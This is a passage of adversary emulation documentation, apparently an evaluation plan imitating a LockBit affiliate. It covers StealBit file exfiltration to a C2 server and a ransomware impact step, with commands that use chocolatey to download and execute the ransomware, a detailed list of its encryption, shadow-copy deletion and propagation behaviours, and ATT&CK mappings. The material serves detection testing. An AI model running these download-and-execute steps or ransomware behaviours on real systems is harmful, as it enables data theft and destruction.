<pre class="language-none"><code v-pre class="language-none">[DEBUG] [2024-07-12T13:13:11] Closing completion port handle.</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the Thundershell window containing the StealBit
output when it&#x27;s finished running.</p>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the C2 server window containing the StealBit
output when it&#x27;s finished running.</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td><code v-pre>ThunderShell</code> executes <code v-pre>chocolatey</code></td>
<td>-</td>
<td>T1059.001 Command and Scripting Interpreter: PowerShell</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-royal" class="outbound" target="_blank"><span>Trend Micro</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>chocolatey</code> downloads <code v-pre>StealBit</code></td>
<td>-</td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>ThunderShell</code> executes <code v-pre>StealBit</code></td>
<td>-</td>
<td>T1059.001 Command and Scripting Interpreter: PowerShell</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-royal" class="outbound" target="_blank"><span>Trend Micro</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> uses Windows API calls</td>
<td><a href="../../resources/stealbit/src/nt.cpp">nt.cpp</a></td>
<td>T1106 Native API</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> checks if being debugged</td>
<td><a href="../../resources/stealbit/src/util.cpp#L103-L109">IsProcessBeingDebugged</a></td>
<td>T1622 Debugger Evasion</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> discovers Windows computer name via GetComputerName</td>
<td><a href="../../resources/stealbit/src/util.cpp#L58-L69">GetSystemComputerName</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> discovers domain name using gethostname and getaddrinfo</td>
<td><a href="../../resources/stealbit/src/util.cpp#L71-L98">GetSystemDomainName</a></td>
<td>T1016 System Network Configuration Discovery</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> enumerates folders and files</td>
<td><a href="../../resources/stealbit/src/enumerate.cpp">enumerate.cpp</a></td>
<td>T1083 File and Directory Discovery</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> automatically collects non-denylisted files</td>
<td><a href="../../resources/stealbit/src/enumerate.cpp">enumerate.cpp</a></td>
<td>T1119 Automated Collection</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> automatically exfiltrates non-denylisted files</td>
<td><a href="../../resources/stealbit/src/io.cpp">io.cpp</a></td>
<td>T1020.001 Automated Exfiltration</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> checks C2 server connectivity using an HTTP GET request</td>
<td><a href="../../resources/stealbit/src/networking.cpp#L7-L25">HTTPRequestHeartbeat</a></td>
<td>T1071.001 Application Layer Protocol: Web Protocols</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool" class="outbound" target="_blank"><span>Cybereason</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/" class="outbound" target="_blank"><span>Yoroi</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> exfiltrates contents using HTTP PUT requests</td>
<td><a href="../../resources/stealbit/src/networking.cpp#L48-L90">UploadFilePUTRequest</a></td>
<td>T1041 Exfiltration Over C2 Channel</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool" class="outbound" target="_blank"><span>Cybereason</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/" class="outbound" target="_blank"><span>Yoroi</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td><code v-pre>StealBit</code> deletes itself</td>
<td><a href="../../resources/stealbit/src/util.cpp#L111-L143">DeleteApplicationImageAfterExecution</a></td>
<td>T1070.004 Indicator Removal: File Deletion</td>
<td><a href="https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf" class="outbound" target="_blank"><span>accenture</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-8---impact-evaluation-step-16">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-8---impact-evaluation-step-16">#</doc-anchor-trigger>
        <span>Step 8 - Impact (Evaluation Step 16)</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>After exfiltration has completed, the LockBit affiliate leverages
<code v-pre>ThunderShell</code> to execute <code v-pre>chocolatey</code> to download then execute the <code v-pre>LockBit</code>
ransomware at <code v-pre>C:\ProgramData\chocolatey\lib\BlockLit\tools\main.exe</code>.</p>
<p>The <code v-pre>LockBit</code> ransomware will perform the following behaviors:</p>
<ul>
<li>Hides threads from debuggers</li>
<li>Uses Windows API hashing to perform dynamic API resolution for certain APIs</li>
<li>Gathers username, domain, and hostname information</li>
<li>Gathers system information (OS version and architecture)</li>
<li>Create a mutex to ensure unique execution</li>
<li>Check system install and default UI languages against allow-list to avoid
executing on certain systems</li>
<li>Enumerates all logical drives to determine encryption targets</li>
<li>Modifies several registry keys to disable the Windows firewall</li>
<li>Deletes shadow copies using WMI and Windows API calls</li>
<li>Uses <code v-pre>bcdedit.exe</code> to disable automatic Windows recovery features</li>
<li>Discovers and pings the local network for discovery of additional targets</li>
<li>Propagates using PsExec</li>
<li>Terminates processes that may interfere with encryption</li>
<li>Terminates and disables services that may interfere with encryption</li>
<li>Clears the Recycle Bin</li>
<li>Sets a custom icon for encrypted files with the <code v-pre>.sk12uyqzk</code> extension via
registry writes to HKCR</li>
<li>Generates 2048-bit RSA session keys to encrypt the AES keys used for file
encryption and stores them in <code v-pre>HKCU\SOFTWARE\BlockBlit</code></li>
<li>Enumerates and encrypts target files in each discovered drive using 256-bit AES
<ul>
<li>Main <code v-pre>C:</code> drive and the discovered mounted file share <code v-pre>Z:</code> drive</li>
</ul>
</li>
<li>Drops a ransom note in traversed directories</li>
<li>Changes the desktop background using registry writes to <code v-pre>HKCU\Control Panel\Desktop</code></li>
<li>Clears Windows Event logs and disables event log channels</li>
<li>Deletes itself on completion by dropping and executing an embedded helper
executable at <code v-pre>C:\Windows\Temp\381jwk.tmp</code>.
<ul>
<li>The helper executable will overwrite and rename the LockBit binary prior to
removing it from disk.</li>
</ul>
</li>
</ul>
<doc-anchor-target id="noise">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#noise">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50A;</span> Noise</span>
    </h3>
</doc-anchor-target>
<p>The following noise activity is executed:</p>
<ul>
<li>User will map a network drive to a remote SMB share</li>
<li>User will copy files from the mapped network drive to local directory</li>
<li>User will disconnect from the mapped network drive</li>
<li>User will clear the recycling bin</li>
</ul>
<doc-anchor-target id="biohazard-procedures-9">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-9">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Switch to the ThunderShell tab and enter the following command to download
<code v-pre>LockBit</code> to <code v-pre>quirrell (10.99.9.202)</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-batch"><code v-pre class="language-batch">choco install BlockLit -y</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the installation output in the Thundershell window.</p>
</li>
<li><p>In the shell interaction prompt, enter the following command to execute
<code v-pre>LockBit</code> with propagation enabled:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-batch"><code v-pre class="language-batch">C:\ProgramData\chocolatey\lib\BlockLit\tools\main.exe -ps</code></pre>
</doc-codeblock></div>
</li>
<li><p>LockBit will return execution output to the Thundershell prompt when complete
(allow 10-15 minutes for completion)</p>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the Thundershell window containing the LockBit output.</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>LockBit uses Windows API calls</td>
<td><a href="../../resources/lockbit/src/common/util/winapihelper.cpp">winapihelper.cpp</a></td>
<td>T1106 Native API</td>
<td><a href="https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 